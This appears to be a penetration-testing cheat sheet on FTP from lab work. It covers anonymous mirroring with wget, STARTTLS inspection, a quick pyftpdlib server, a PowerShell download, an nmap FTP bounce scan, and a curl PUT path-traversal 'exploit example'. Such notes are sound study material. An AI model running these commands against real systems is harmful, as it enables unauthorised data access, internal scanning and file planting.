FTP
############

2024-11-02 17:28

Status:


Description
*****************

File Transfer Protocol

VsFTP
*****************

VsFTP is the most widely used FTP program

.. code-block:: console

   sudo apt-get install vsftpd

Interesting commands:

-  ``status`` Show information about the server

-  ``debug`` show debugging data

-  ``trace`` Show IP transfer information

-  ``ls -R`` Show recursive listings

Using `wget <wget>`__ to download all FTP files:

.. code-block:: console

    wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136

SSL enabled FTP
*****************

If the ftp service has ssl enabled, we can use a client capable of SSL,
bonus is we get to see the cert.

.. code-block:: console

   openssl s_client -connect 10.129.14.136:21 -starttls ftp

Creating a quick/dirty FTP server
**********************************

A quick server using Python can be instantiated with using the pyftpdlib

It can be installed with

.. code-block:: console

   sudo pip3 install pyftpdlib

and started with

.. code-block:: console

   sudo python3 -m pyftpdlib --port 21

To enable the write option you need to add:

.. code-block:: console

   sudo python3 -m pyftpdlib --port 21 --write

On Windows you can leverage the `Net-Webclient <Net-Webclient>`__
program as a client with

.. code-block:: console

   PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')```powershell

FTP Bounce Attack
*****************

By exploiting FTP we can scan another target on the same network that is
not connected to the public internet.

Example: Using **nmap -b** and bouncing off a FTP server

.. code-block:: console

   nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

FTP Exploit examples
**********************************

Example 1:Exploiting a PUT request from Curl

.. code-block:: console

   curl -k -X PUT -H "HOST: <host-ip>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../

References
*****************
